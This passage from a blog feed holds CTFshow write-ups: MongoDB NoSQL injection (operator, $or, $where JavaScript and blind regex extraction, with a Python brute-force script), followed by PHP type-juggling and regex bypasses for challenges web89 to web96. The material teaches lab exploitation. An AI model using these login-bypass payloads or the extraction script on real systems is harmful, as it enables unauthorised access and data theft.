&lt;p&gt;这一题有点变化，但是没啥影响，这个 pretty () 方法的作用是使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。&lt;/p&gt;
&lt;p&gt;用前面的永真测试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163248398.png&#34; alt=&#34;image-20230301163248398&#34; /&gt;&lt;/p&gt;
&lt;p&gt;和上面一样，第一条没有 flag 尝试直接读 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163351837.png&#34; alt=&#34;image-20230301163351837&#34; /&gt;&lt;/p&gt;
&lt;p&gt;也是失败的，尝试跳过 admin，但是还有 admin1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163457769.png&#34; alt=&#34;image-20230301163457769&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里要用到前面的正则&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username[$regex]=^[^a].*$&amp;amp;password[$ne]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163637992.png&#34; alt=&#34;image-20230301163637992&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;联合查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#联合查询&#34;&gt;#&lt;/a&gt; 联合查询&lt;/h2&gt;
&lt;p&gt;前面有提到，mongodb 使用的是 json 的查询结构，json 对字符串的拼接也有着类似传统 sql 注入的地方&lt;/p&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;string query =&amp;quot;&amp;#123; username: &#39;&amp;quot; + $username + &amp;quot;&#39;, password: &#39;&amp;quot; + $password + &amp;quot;&#39; &amp;#125;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当用户输入用户名和密码后，这里如果对用户输入的校验不足&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&amp;#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#39;123456&#39;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就可以构造 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;username=admin&#39;, $or: [ &amp;#123;&amp;#125;, &amp;#123;&#39;a&#39;: &#39;a&amp;amp;password=&#39; &amp;#125;], $comment: &#39;123456
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拼接后相当于是执行了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&amp;#123; username: &#39;admin&#39;, $or: [ &amp;#123;&amp;#125;, &amp;#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &amp;#125;], $comment: &#39;123456&#39;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个就类似&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;select * from logins where username = &#39;admin&#39; and (password true&amp;lt;&amp;gt; or (&#39;a&#39;=&#39;a&#39; and password = &#39;&#39;))
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;js注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#js注入&#34;&gt;#&lt;/a&gt; js 注入&lt;/h2&gt;
&lt;p&gt;攻击者通过构造恶意的查询语句，利用 NoSQL 数据库的查询语句中可执行 JavaScript 代码的特性，来获取敏感信息或实现远程执行等攻击&lt;/p&gt;
&lt;p&gt;在 NoSQL 数据库中，由于查询语句中允许执行 JavaScript 代码，因此攻击者可以在查询语句中注入恶意的 JavaScript 代码，从而获取敏感信息。例如，攻击者可以通过构造恶意的查询语句来绕过登录验证，获取管理员权限。同时，攻击者还可以利用查询语句中执行 JavaScript 代码的特性来实现远程执行攻击，例如在服务器上执行任意的系统命令，导致服务器被入侵控制等。&lt;/p&gt;
&lt;h3 id=&#34;where操作符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#where操作符&#34;&gt;#&lt;/a&gt; $where 操作符&lt;/h3&gt;
&lt;p&gt;$where 操作符是 MongoDB 中的一种查询语句，可以用于执行自定义的 JavaScript 表达式，并返回符合条件的文档。&lt;/p&gt;
&lt;p&gt;在 MongoDB 中，可以使用 $where 操作符在集合中进行查询，示例代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;db.collection.find( &amp;#123; $where: function() &amp;#123; return this.field1 == this.field2; &amp;#125; &amp;#125; )
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这个例子中，$where 操作符的参数是一个 JavaScript 函数，函数体内使用了 MongoDB 的 JavaScript Shell 中的 this 变量，指代了当前文档对象。函数体中的表达式用于检查文档中的某些字段是否相等，如果相等，则返回该文档。&lt;/p&gt;
&lt;p&gt;需要注意的是，使用 $where 操作符需要在查询中执行 JavaScript 代码，因此性能可能会较差，不建议在大数据量的环境中使用。此外，由于 JavaScript 语言的灵活性，$where 查询可能存在安全风险，攻击者可以通过构造恶意代码实现注入攻击，因此需要谨慎使用。&lt;/p&gt;
&lt;p&gt;通常情况下，应该优先选择 MongoDB 提供的其他查询语句，比如 $eq、$ne、$in 等操作符，这些操作符可以更高效地执行查询，并且不会引入安全风险。只有在特定的场景下，才需要使用 $where 操作符进行高度定制化的查询。&lt;/p&gt;
&lt;p&gt;如下实例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;&amp;gt; db.users.find(&amp;#123; $where: &amp;quot;function()&amp;#123;return(this.username == &#39;whoami&#39;)&amp;#125;&amp;quot; &amp;#125;)
&amp;#123; &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;60fa9c80257f18542b68c4b9&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;whoami&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;657260&amp;quot; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于使用了  &lt;code&gt;$where&lt;/code&gt;  关键字，其后面的 JavaScript 将会被执行并返回 &amp;quot;whoami&amp;quot;，然后将查询出 username 为 whoami 的数据。&lt;/p&gt;
&lt;p&gt;某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中  &lt;code&gt;$userData&lt;/code&gt;  获取查询条件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;db.users.find(&amp;#123; $where: &amp;quot;function()&amp;#123;return(this.username == $userData)&amp;#125;&amp;quot; &amp;#125;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后，攻击者可能会注入一种恶意的字符串如  &lt;code&gt;&#39;a&#39;; sleep(5000)&lt;/code&gt;  ，此时 MongoDB 执行的查询语句为：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;db.users.find(&amp;#123; $where: &amp;quot;function()&amp;#123;return(this.username == &#39;a&#39;; sleep(5000))&amp;#125;&amp;quot; &amp;#125;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果此时服务器有 5 秒钟的延迟则说明注入成功。&lt;/p&gt;
&lt;p&gt;以下是一个简单的示例，假设一个应用使用 MongoDB 作为数据库，有一个用户登录的验证过程：&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; query &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; password &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;users&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;query&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;err&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throw&lt;/span&gt; err&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Login success&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Login failed&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在这个过程中，黑客可以通过构造特定的 JavaScript 代码来注入恶意脚本，例如将 password 参数设置为以下内容：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;&amp;#123; $ne: &#39;1&#39; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个语句会使得 MongoDB 查询语句的结果永远为真，从而可以成功绕过登录验证。&lt;/p&gt;
&lt;h2 id=&#34;盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#盲注&#34;&gt;#&lt;/a&gt; 盲注&lt;/h2&gt;
&lt;h3 id=&#34;web253&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web253&#34;&gt;#&lt;/a&gt; web253&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163922915.png&#34; alt=&#34;image-20230301163922915&#34; /&gt;&lt;/p&gt;
&lt;p&gt;还是没啥改变，继续用前面的测试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163959772.png&#34; alt=&#34;image-20230301163959772&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里测试发现登录成功，但是没有回显了，那肯定就是盲注咯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author： Clown
# datetime： 2023/3/1 16:49 
# ide： PyCharm
import requests

url = &amp;quot;http://65083bf6-7c9c-4c55-ba15-aa555b4df664.challenge.ctf.show/api/&amp;quot;
proxies=&amp;#123;&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;,&#39;https&#39;:&#39;https://127.0.0.1:8080&#39;&amp;#125;
headers = &amp;#123;
    &amp;quot;Content-Type&amp;quot;:&amp;quot;application/x-www-form-urlencoded&amp;quot;
&amp;#125;
flag=&amp;quot;&amp;quot;

for i in range(100):
    for ch in &amp;quot;&amp;#123;-abcdefghijklmnopqrstuvwxyz0123456789&amp;#125;&amp;quot;:
        payload = &amp;quot;^&amp;#123;&amp;#125;.*$&amp;quot;.format(flag+ch)
        data = &amp;quot;username[$regex]=flag&amp;amp;password[$regex]=&amp;quot;+payload
        #print(data)
        r = requests.post(url=url,data=data,proxies=proxies,headers=headers)
        #print(r.text)
        if r&amp;quot;\u767b\u9646\u6210\u529f&amp;quot; in r.text:
            flag=flag+ch
            print(flag)
            if ch==&amp;quot;&amp;#125;&amp;quot;:
                exit()
            break
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301175801860.png&#34; alt=&#34;image-20230301175801860&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/02/15/php%E7%89%B9%E6%80%A7/</guid>
            <title>CTFshow-web入门php特性</title>
            <link>https://blog.xcu.icu/2023/02/15/php%E7%89%B9%E6%80%A7/</link>
            <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
            <category term="php特性" scheme="https://blog.xcu.icu/tags/php%E7%89%B9%E6%80%A7/" />
            <pubDate>Wed, 15 Feb 2023 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;勉勉强强算是详解吧&lt;/p&gt;
&lt;h1 id=&#34;前篇&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前篇&#34;&gt;#&lt;/a&gt; 前篇&lt;/h1&gt;
&lt;h2 id=&#34;web89&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web89&#34;&gt;#&lt;/a&gt; web89&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);

if(isset($_GET[&#39;num&#39;]))&amp;#123;
    $num = $_GET[&#39;num&#39;];
    if(preg_match(&amp;quot;/[0-9]/&amp;quot;, $num))&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(intval($num))&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先 intval () 函数是用于获取变量的整数值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111192534964.png&#34; alt=&#34;image-20230111192534964&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$num=&amp;quot;1&amp;quot;;
echo preg_match(&amp;quot;/[0-9]/&amp;quot;, $num).&amp;quot;\n&amp;quot;;
echo intval($num).&amp;quot;\n&amp;quot;;
$w=&amp;quot;a&amp;quot;;
echo preg_match(&amp;quot;/[0-9]/&amp;quot;, $w).&amp;quot;\n&amp;quot;;
echo intval($w).&amp;quot;\n&amp;quot;;
$q=&amp;quot;1a&amp;quot;;
echo preg_match(&amp;quot;/[0-9]/&amp;quot;, $q).&amp;quot;\n&amp;quot;;
echo intval($q).&amp;quot;\n&amp;quot;;
$a[]=&amp;quot;a&amp;quot;;
echo @preg_match(&amp;quot;/[0-9]/&amp;quot;, $a).&amp;quot;\n&amp;quot;;
echo @intval($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107173642929.png&#34; alt=&#34;image-20221107173642929&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里可以看到，当变量为数字时两个函数返回值都是 1，当变量为字母的时候，两个函数返回的都是 0，当变量是字符串的时候，当变量中是由数字的字符串时函数的返回值为 1，但是当变量为数组时，preg_match 的返回值为空而 intval 的返回值为一，所以这里可以使用数组绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/?num[]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107174022859.png&#34; alt=&#34;image-20221107174022859&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web90&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web90&#34;&gt;#&lt;/a&gt; web90&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&amp;#123;
    $num = $_GET[&#39;num&#39;];
    if($num===&amp;quot;4476&amp;quot;)&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(intval($num,0)===4476)&amp;#123;
        echo $flag;
    &amp;#125;else&amp;#123;
        echo intval($num,0);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据上面提到的特性，这里直接传进去一个 4476 + 字母即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;?num=4476a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221107190716542.png&#34; alt=&#34;image-20221107190716542&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web91&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web91&#34;&gt;#&lt;/a&gt; web91&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
show_source(__FILE__);
include(&#39;flag.php&#39;);
$a=$_GET[&#39;cmd&#39;];
if(preg_match(&#39;/^php$/im&#39;, $a))&amp;#123;
    if(preg_match(&#39;/^php$/i&#39;, $a))&amp;#123;
        echo &#39;hacker&#39;;
    &amp;#125;
    else&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
else&amp;#123;
    echo &#39;nonononono&#39;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里是正则的一个小特性，可以去看看我的&lt;a href=&#34;https://blog.xcu.icu/2022/11/09/preg_match&amp;amp;&amp;amp;%E6%AD%A3%E5%88%99/&#34;&gt; preg_match&amp;amp;&amp;amp; 正则 - Web | Clown の Blog = (xcu.icu)&lt;/a&gt; 这篇文章，绕过这个的方法也不难，第一个是多行匹配，第二个是只匹配一行，且遇到换行返回空&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?cmd=a%0aphp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109231302790.png&#34; alt=&#34;image-20221109231302790&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web92&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web92&#34;&gt;#&lt;/a&gt; web92&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&amp;#123;
    $num = $_GET[&#39;num&#39;];
    if($num==4476)&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(intval($num,0)==4476)&amp;#123;
        echo $flag;
    &amp;#125;else&amp;#123;
        echo intval($num,0);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;intval 获取变量的整数值，前面又不能相等，但是它又加了一个 0，这里用 e 来构造科学计数法或者写一个小数都行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?num=4476.1
?num=4476e1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109232250065.png&#34; alt=&#34;image-20221109232250065&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web93&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web93&#34;&gt;#&lt;/a&gt; web93&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&amp;#123;
    $num = $_GET[&#39;num&#39;];
    if($num==4476)&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(preg_match(&amp;quot;/[a-z]/i&amp;quot;, $num))&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(intval($num,0)==4476)&amp;#123;
        echo $flag;
    &amp;#125;else&amp;#123;
        echo intval($num,0);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不让用字母了，那就用小数点呗&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?num=4476.1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109232530653.png&#34; alt=&#34;image-20221109232530653&#34; /&gt;&lt;/p&gt;
&lt;p&gt;还能用进制转换&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;二进制0bxxx
八进制0xxxxxx
十六进制0xaaaa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;二进制和十六进制想正常识别都有字母，只有八进制能用了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221109233000924.png&#34; alt=&#34;image-20221109233000924&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web94&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web94&#34;&gt;#&lt;/a&gt; web94&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&amp;#123;
    $num = $_GET[&#39;num&#39;];
    if($num===&amp;quot;4476&amp;quot;)&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(preg_match(&amp;quot;/[a-z]/i&amp;quot;, $num))&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(!strpos($num, &amp;quot;0&amp;quot;))&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(intval($num,0)===4476)&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;strpos () f 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）&lt;/p&gt;
&lt;p&gt;那就继续小数点解决，第一次出现的位置，加一个空格干扰一下就行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110001332708.png&#34; alt=&#34;image-20221110001332708&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web95&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web95&#34;&gt;#&lt;/a&gt; web95&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&amp;#123;
    $num = $_GET[&#39;num&#39;];
    if($num==4476)&amp;#123;
        die(&amp;quot;no no no!&amp;quot;);
    &amp;#125;
    if(preg_match(&amp;quot;/[a-z]|\./i&amp;quot;, $num))&amp;#123;
        die(&amp;quot;no no no!!&amp;quot;);
    &amp;#125;
    if(!strpos($num, &amp;quot;0&amp;quot;))&amp;#123;
        die(&amp;quot;no no no!!!&amp;quot;);
    &amp;#125;
    if(intval($num,0)===4476)&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;小数点被加入黑名单了，那就使用空格干扰&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003134354.png&#34; alt=&#34;image-20221110003134354&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web96&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web96&#34;&gt;#&lt;/a&gt; web96&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;u&#39;]))&amp;#123;
    if($_GET[&#39;u&#39;]==&#39;flag.php&#39;)&amp;#123;
        die(&amp;quot;no no no&amp;quot;);
    &amp;#125;else&amp;#123;
        highlight_file($_GET[&#39;u&#39;]);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里先引出报错&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221110003333642.png&#34; alt=&#34;image-20221110003333642&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看到文件路径，这里传入完整路径就可以了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;?u=/var/www/html/flag.php
&lt;/code&gt;&lt;/pre&gt;
